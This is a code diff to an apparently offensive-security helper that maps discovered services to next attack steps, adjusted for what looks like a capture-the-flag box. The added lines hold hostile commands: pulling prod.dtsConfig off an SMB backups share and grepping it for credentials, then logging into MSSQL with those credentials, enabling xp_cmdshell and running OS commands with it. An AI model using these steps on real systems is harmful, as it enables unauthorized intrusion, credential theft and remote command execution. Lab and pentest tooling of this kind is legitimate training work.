@@ -1,5 +1,5 @@
 from __future__ import annotations
-from typing import List, Dict, Tuple
+from typing import List, Dict, Tuple, Optional
 
 Service = Dict[str, object]
 
@@ -11,7 +11,12 @@ def _svc_name(s: Service) -> str:
     return f"{port}/{proto} {name}".strip()
 
 
-def next_steps_from_services(services: List[Service], verbose: bool = True) -> List[Tuple[str, str]]:
+def next_steps_from_services(
+    services: List[Service],
+    verbose: bool = True,
+    target: Optional[str] = None,
+    creds: Optional[List[Dict[str, str]]] = None,
+) -> List[Tuple[str, str]]:
     out: List[Tuple[str, str]] = []
     if not services:
         return out
@@ -24,6 +29,23 @@ def next_steps_from_services(services: List[Service], verbose: bool = True) -> L
     ]
     if verbose:
         out.append(("General", "\n".join(generic)))
+
+    # Prefer a credential relevant to a service if provided
+    cred_user: Optional[str] = None
+    cred_pass: Optional[str] = None
+    if creds:
+        # try to find service-specific first
+        svc_names = [str(x.get("service", "")).lower() for x in services]
+        pick = None
+        for c in creds:
+            sv = str(c.get("service", "")).lower()
+            if sv and any(sv in n for n in svc_names):
+                pick = c
+                break
+        if pick is None:
+            pick = creds[0]
+        cred_user = str(pick.get("user")) if pick.get("user") else None
+        cred_pass = str(pick.get("pass")) if pick.get("pass") else None
 
     for s in services:
         port = int(s.get("port", 0) or 0)
@@ -50,9 +72,14 @@ def next_steps_from_services(services: List[Service], verbose: bool = True) -> L
         if port in (139, 445) or "smb" in name:
             steps += [
                 "List shares: smbclient -L //<target> -N",
-                "Anonymous access: smbclient //<target>/share -N",
+                "Anonymous access (try backups): smbclient //<target>/backups -N",
                 "Enum: nxc smb <target> -u '' -p '' --shares",
             ]
+            if target:
+                steps += [
+                    f"Example: smbclient //{target}/backups -N -c 'ls; get prod.dtsConfig'",
+                    "Extract creds from prod.dtsConfig (ConnectionString): grep -E 'User ID|Password' prod.dtsConfig",
+                ]
         if port == 21 or "ftp" in name:
             steps += [
                 "Anonymous login: ftp <target> (user: anonymous)",
@@ -73,8 +100,21 @@ def next_steps_from_services(services: List[Service], verbose: bool = True) -> L
             ]
         if port == 1433 or "mssql" in name:
             steps += [
-                "sqsh/mssqlclient.py: check xp_cmdshell, impersonation",
+                "mssqlclient.py: authenticate and enable xp_cmdshell, then execute",
             ]
+            if target and cred_user and cred_pass:
+                steps += [
+                    f"Login: mssqlclient.py {cred_user}:{cred_pass}@{target} -windows-auth",
+                    "Enable xp_cmdshell: EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
+                    "Test: EXEC xp_cmdshell 'whoami';",
+                    "List users: EXEC xp_cmdshell 'dir C:\\Users';",
+                    "Read user flag (adjust user folder): EXEC xp_cmdshell 'type C:\\Users\\<user>\\Desktop\\user.txt';",
+                ]
+            elif target:
+                steps += [
+                    f"Login (prompt for pass): mssqlclient.py <user>@{target} -windows-auth",
+                    "Then enable xp_cmdshell and execute commands as above",
+                ]
         if port == 6379 or "redis" in name:
             steps += [
                 "redis-cli -h <target> info; check unauth, write ssh-key trick",
